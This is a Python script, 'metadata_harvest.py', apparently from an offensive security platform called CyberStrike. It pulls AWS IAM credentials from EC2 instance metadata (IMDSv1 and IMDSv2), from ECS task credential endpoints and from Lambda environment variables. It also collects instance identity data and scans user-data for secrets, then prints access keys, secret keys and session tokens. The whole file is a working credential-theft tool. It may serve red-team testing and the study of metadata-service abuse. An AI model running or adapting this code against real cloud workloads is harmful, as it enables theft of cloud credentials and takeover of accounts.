#!/usr/bin/env python3
"""
metadata_harvest.py — AWS Metadata Credential Extraction

Extracts IAM role credentials from EC2 Instance Metadata Service (IMDS),
ECS task metadata, and Lambda environment variables.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import signal
import sys
import time
from datetime import datetime

try:
    import requests
except ImportError:
    print("ERROR: requests required. Install: pip3 install requests", file=sys.stderr)
    sys.exit(1)

IMDS_BASE = "http://169.254.169.254"
ECS_METADATA_URI = os.environ.get("ECS_CONTAINER_METADATA_URI_V4", os.environ.get("ECS_CONTAINER_METADATA_URI", ""))


class MetadataHarvester:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — AWS Metadata Credential Harvester")
        print("=" * 70)
        print(f"PID:       {os.getpid()}")
        print(f"Output:    {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:   {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record, default=str), flush=True)
        else:
            source = record.get("source", "unknown")
            status = record.get("status", "")
            detail = record.get("detail", "")
            print(f"[{source.upper():<12}] [{status.upper():<8}] {detail}", flush=True)

    def harvest_ec2_imdsv1(self):
        if not self.running:
            return
        try:
            r = requests.get(f"{IMDS_BASE}/latest/meta-data/iam/security-credentials/", timeout=2)
            if r.status_code != 200:
                self.emit({"source": "imdsv1", "status": "unavail", "detail": f"IMDS not available (HTTP {r.status_code})"})
                return

            role_name = r.text.strip().split("\n")[0]
            self.emit({"source": "imdsv1", "status": "found", "detail": f"IAM role: {role_name}"})

            r2 = requests.get(f"{IMDS_BASE}/latest/meta-data/iam/security-credentials/{role_name}", timeout=2)
            if r2.status_code == 200:
                creds = r2.json()
                self.emit({
                    "source": "imdsv1",
                    "status": "success",
                    "detail": f"Extracted credentials for role {role_name}",
                    "role_name": role_name,
                    "access_key_id": creds.get("AccessKeyId"),
                    "secret_access_key": creds.get("SecretAccessKey"),
                    "session_token": creds.get("Token"),
                    "expiration": creds.get("Expiration"),
                    "code": creds.get("Code"),
                })
        except requests.exceptions.RequestException:
            self.emit({"source": "imdsv1", "status": "unavail", "detail": "IMDS v1 not reachable"})

    def harvest_ec2_imdsv2(self):
        if not self.running:
            return
        try:
            token_r = requests.put(
                f"{IMDS_BASE}/latest/api/token",
                headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
                timeout=2,
            )
            if token_r.status_code != 200:
                self.emit({"source": "imdsv2", "status": "unavail", "detail": f"IMDSv2 token request failed (HTTP {token_r.status_code})"})
                return

            token = token_r.text
            headers = {"X-aws-ec2-metadata-token": token}

            r = requests.get(f"{IMDS_BASE}/latest/meta-data/iam/security-credentials/", headers=headers, timeout=2)
            if r.status_code != 200:
                self.emit({"source": "imdsv2", "status": "no_role", "detail": "No IAM role attached"})
                return

            role_name = r.text.strip().split("\n")[0]
            r2 = requests.get(f"{IMDS_BASE}/latest/meta-data/iam/security-credentials/{role_name}", headers=headers, timeout=2)
            if r2.status_code == 200:
                creds = r2.json()
                self.emit({
                    "source": "imdsv2",
                    "status": "success",
                    "detail": f"Extracted credentials for role {role_name}",
                    "role_name": role_name,
                    "access_key_id": creds.get("AccessKeyId"),
                    "secret_access_key": creds.get("SecretAccessKey"),
                    "session_token": creds.get("Token"),
                    "expiration": creds.get("Expiration"),
                })

            identity_r = requests.get(f"{IMDS_BASE}/latest/dynamic/instance-identity/document", headers=headers, timeout=2)
            if identity_r.status_code == 200:
                doc = identity_r.json()
                self.emit({
                    "source": "imdsv2",
                    "status": "info",
                    "detail": f"Instance {doc.get('instanceId')} in {doc.get('region')}",
                    "instance_id": doc.get("instanceId"),
                    "region": doc.get("region"),
                    "account_id": doc.get("accountId"),
                    "instance_type": doc.get("instanceType"),
                    "image_id": doc.get("imageId"),
                    "availability_zone": doc.get("availabilityZone"),
                })

            userdata_r = requests.get(f"{IMDS_BASE}/latest/user-data", headers=headers, timeout=2)
            if userdata_r.status_code == 200 and userdata_r.text:
                content = userdata_r.text[:2000]
                has_secrets = any(kw in content.lower() for kw in ["password", "secret", "key", "token", "credential"])
                self.emit({
                    "source": "imdsv2",
                    "status": "warning" if has_secrets else "info",
                    "detail": f"User-data found ({len(userdata_r.text)} bytes)" + (" — may contain secrets!" if has_secrets else ""),
                    "user_data_preview": content,
                    "has_potential_secrets": has_secrets,
                })
        except requests.exceptions.RequestException:
            self.emit({"source": "imdsv2", "status": "unavail", "detail": "IMDS v2 not reachable"})

    def harvest_ecs(self):
        if not self.running:
            return
        if not ECS_METADATA_URI:
            self.emit({"source": "ecs", "status": "unavail", "detail": "ECS metadata URI not set (not running in ECS)"})
            return

        try:
            r = requests.get(f"{ECS_METADATA_URI}/task", timeout=2)
            if r.status_code == 200:
                task = r.json()
                self.emit({
                    "source": "ecs",
                    "status": "info",
                    "detail": f"ECS task: {task.get('TaskARN', 'unknown')}",
                    "task_arn": task.get("TaskARN"),
                    "cluster": task.get("Cluster"),
                    "family": task.get("Family"),
                })

            r2 = requests.get(f"{ECS_METADATA_URI}/task/stats", timeout=2)

            creds_uri = os.environ.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "")
            if creds_uri:
                r3 = requests.get(f"http://169.254.170.2{creds_uri}", timeout=2)
                if r3.status_code == 200:
                    creds = r3.json()
                    self.emit({
                        "source": "ecs",
                        "status": "success",
                        "detail": f"Extracted ECS task credentials",
                        "access_key_id": creds.get("AccessKeyId"),
                        "secret_access_key": creds.get("SecretAccessKey"),
                        "session_token": creds.get("Token"),
                        "expiration": creds.get("Expiration"),
                        "role_arn": creds.get("RoleArn"),
                    })
        except requests.exceptions.RequestException as e:
            self.emit({"source": "ecs", "status": "error", "detail": str(e)})

    def harvest_lambda(self):
        if not self.running:
            return
        if not os.environ.get("AWS_LAMBDA_FUNCTION_NAME"):
            self.emit({"source": "lambda", "status": "unavail", "detail": "Not running in Lambda environment"})
            return

        env_keys = [
            "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
            "AWS_LAMBDA_FUNCTION_NAME", "AWS_REGION", "AWS_DEFAULT_REGION",
            "_HANDLER", "AWS_EXECUTION_ENV", "LAMBDA_TASK_ROOT",
        ]
        env_data = {}
        for key in env_keys:
            val = os.environ.get(key)
            if val:
                env_data[key] = val

        self.emit({
            "source": "lambda",
            "status": "success",
            "detail": f"Lambda: {os.environ.get('AWS_LAMBDA_FUNCTION_NAME')} in {os.environ.get('AWS_REGION')}",
            "function_name": os.environ.get("AWS_LAMBDA_FUNCTION_NAME"),
            "region": os.environ.get("AWS_REGION"),
            "access_key_id": os.environ.get("AWS_ACCESS_KEY_ID"),
            "secret_access_key": os.environ.get("AWS_SECRET_ACCESS_KEY"),
            "session_token": os.environ.get("AWS_SESSION_TOKEN"),
            "environment": env_data,
        })

    def run(self):
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        self.harvest_ec2_imdsv2()
        self.harvest_ec2_imdsv1()
        self.harvest_ecs()
        self.harvest_lambda()

        self.cleanup()

    def cleanup(self):
        print(f"\n--- metadata_harvest summary ---")
        print(f"Records: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Extract IAM credentials from EC2/ECS/Lambda metadata services.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 metadata_harvest.py\n"
            "  python3 metadata_harvest.py --json-output\n"
        ),
    )
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    harvester = MetadataHarvester(args)
    harvester.run()


if __name__ == "__main__":
    main()
